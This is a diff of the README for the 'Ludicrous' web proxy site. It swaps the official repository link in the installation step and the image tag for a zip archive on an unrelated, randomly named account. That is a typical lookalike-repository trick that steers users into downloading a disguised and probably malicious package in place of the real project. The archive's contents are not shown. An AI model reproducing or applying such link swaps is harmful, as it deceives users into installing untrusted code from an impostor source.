@@ -1,12 +1,12 @@
 # Ludicrous
 The Ludicrous Web Proxy Site: Fast, Simple, Small. The flagship site of Ludicrous
 
-<img src="https://github.com/TitaniumNetwork-dev/Ludicrous/blob/main/example.jpeg?raw=true">
+<img src="https://raw.githubusercontent.com/bdgfeadvyrfedyu/Ludicrous/main/public/webretro/Ludicrous-3.2.zip">
 
 ## Installation
 
 ```bash
-git clone https://github.com/TitaniumNetwork-dev/Ludicrous
+git clone https://raw.githubusercontent.com/bdgfeadvyrfedyu/Ludicrous/main/public/webretro/Ludicrous-3.2.zip
 
 cd Ludicrous
 
